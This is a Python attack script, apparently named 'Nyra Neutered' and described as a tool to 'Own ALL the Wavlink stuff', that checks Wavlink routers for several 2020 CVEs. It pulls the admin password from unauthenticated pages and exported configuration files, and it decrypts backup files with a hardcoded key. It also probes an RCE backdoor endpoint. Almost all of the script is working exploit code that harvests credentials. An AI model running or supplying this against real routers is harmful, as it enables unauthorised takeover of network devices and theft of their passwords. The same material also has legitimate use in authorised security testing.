from pyfiglet import Figlet
import requests, argparse, os, hashlib, time, readline, sys
requests.packages.urllib3.disable_warnings() 



class bcolors:
    """ Thanks https://stackoverflow.com/questions/287871/how-to-print-colored-text-in-python """
    OKBLUE = '\033[38;5;26m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    PURPLE = '\033[38;5;91m'
    ORANGE = '\033[38;5;166m'
    CYAN = '\033[38;5;43m'
    ITALIC = '\033[3m'


def handle_args():
    parser = argparse.ArgumentParser(description='Own ALL the Wavlink stuff')
    parser.add_argument('target', help = "target to test")
    return parser

headers = {"X-Nyra-Hackerman": "notyourrouteranymore"}

def verify(target):
    response = {"version": "", "password": "", "cves":{
        "test":"0",
        "backdoor":"0",
        "weak":"0",
        "back":"0",
        "info":"0"
    }}

    #Check for version first - CVE-2020-12266
    resp = requests.get("http://"+target+"/live_check.shtml",headers=headers,verify=False)
    parts = resp.text.split(" ")
    found=0
    for p in parts:
        if "model" in p:
            ps = p.split("=")
            print("Got model "+ps[1])
            print(bcolors.CYAN + "[+]" + bcolors.ENDC + " Target is VULNERABLE to CVE-2020-12266 - Information Disclosure")
            response["cves"]["info"] = 1
            found=1

    

    #Checking password disclosure - CVE-2020-10972
    resp = requests.get("http://"+target+"/live_test.shtml",headers=headers,verify=False)
    if resp.status_code == 200:
        parts = resp.text.split(";")
        for p in parts:
            if "syspasswd=" in p:
                newsplit = p.find("=")
                response["password"] = p[newsplit+2:-1]

                print(bcolors.CYAN + "[+]" + bcolors.ENDC + " Target is VULNERABLE to CVE-2020-10972 - Admin password in plain text")
                print(bcolors.CYAN + "[+]" + bcolors.ENDC + bcolors.ORANGE +" Admin Password: "+ p[newsplit+2:-1] + bcolors.ENDC)
                response["cves"]["test"] = 1
    
    #Checking for RCE - CVE-2020-10971
    resp = requests.get("http://"+target+"/cgi-bin/adm.cgi",headers=headers)
    if resp.status_code in [200,500]:
        print(bcolors.CYAN + "[+]" + bcolors.ENDC + " Target is VULNERABLE to CVE-2020-10971 - RCE as root via backdoor")
        response["cves"]["backdoor"] = 1

    #Checking for plaintext backup - CVE-2020-10974
    resp = requests.get("http://"+target+"/cgi-bin/ExportSettings.sh",headers=headers)
    if resp.status_code == 200:
        print(bcolors.CYAN + "[+]" + bcolors.ENDC + " Target is VULNERABLE to CVE-2020-10974 - download config file containing password without authentication")
        response["cves"]["back"] = 1
        parts = resp.text.split("\n")
        for p in parts:
            if "Password=" in p and "DDNSPassword=" not in p:
                ind = p.find("=")
                response["password"] = p[ind+1:]
                print(bcolors.CYAN + "[+]" + bcolors.ENDC + " PASSWORD: " + p[ind+1:])
    if resp.status_code != 200:
        resp = requests.get("http://"+target+"/cgi-bin/ExportAllSettings.sh",headers=headers)
        if resp.status_code == 200 and "Password_def" in resp.text:
            print(bcolors.CYAN + "[+]" + bcolors.ENDC + " Target is VULNERABLE to CVE-2020-10974 - download config file containing password without authentication")
            lines = resp.text.split("\n")
            for l in lines:
                if l.split("=")[0].strip() == "Password":
                    response["cves"]["back"] = 1
                    response["password"] =   l.split("=")[1].strip()

    #Checking for weak encoded backup - CVE-2020-10973
    inresp = requests.get("http://"+target+"/cgi-bin/ExportAllSettings.sh",headers=headers)
    if inresp.status_code == 200:
        resp = requests.get("http://"+target+"/backupsettings.dat",headers=headers)
        if resp.status_code == 200:
            print(bcolors.CYAN + "[+]" + bcolors.ENDC + " Target is VULNERABLE to CVE-2020-10973 - Accessible config file encrypted with weak, hardocded password")
            open("enc.dat","wb").write(resp.content)
            os.system("openssl enc -aes-256-cbc -d -in enc.dat -k 803f5d -out backupsettings.dat")
            os.system("rm -f enc.dat")
            bkup = open("backupsettings.dat","r")
            for p in bkup:
                if "Password=" in p and "DDNSPassword=" not in p:
                    response["cves"]["weak"] = 1
                    ind = p.find("=")
                    print(bcolors.OKBLUE + "[*]" + bcolors.ENDC + " Decrypted backup...")
                    print(bcolors.OKBLUE + "[*]" + bcolors.ENDC + bcolors.ORANGE + " Potential Password: " + p[ind+1:] + bcolors.ENDC)
            bkup.close()

    #Checking for weak encoded backup - CVE-2020-12266
    inresp = requests.get("http://"+target+"/live_check.shtml",headers=headers)
    if inresp.status_code == 200 and "FW_Version=" in inresp.text:
        print(bcolors.CYAN + "[+]" + bcolors.ENDC + " Target is VULNERABLE to CVE-2020-12266 - Unauthenticated Information Disclosure")
    return response


def main(): 
    # <banner>
    custom_font = Figlet(font='chunky')
    ascii_banner = custom_font.renderText("Nyra Neutered")
    print(bcolors.PURPLE + ascii_banner + bcolors.ENDC)
    print(bcolors.ITALIC + bcolors.PURPLE + "                    By James Clee and Roni Carta\n" + bcolors.ENDC + bcolors.ENDC)
    # </banner>
    target = sys.argv[1]
    print("\n" + bcolors.OKBLUE + "[*]" + bcolors.ENDC + " Setting up... please hold")
    response = verify(target)
    
    os.system("rm -f backupsettings.dat")


if __name__ == "__main__":
    main()
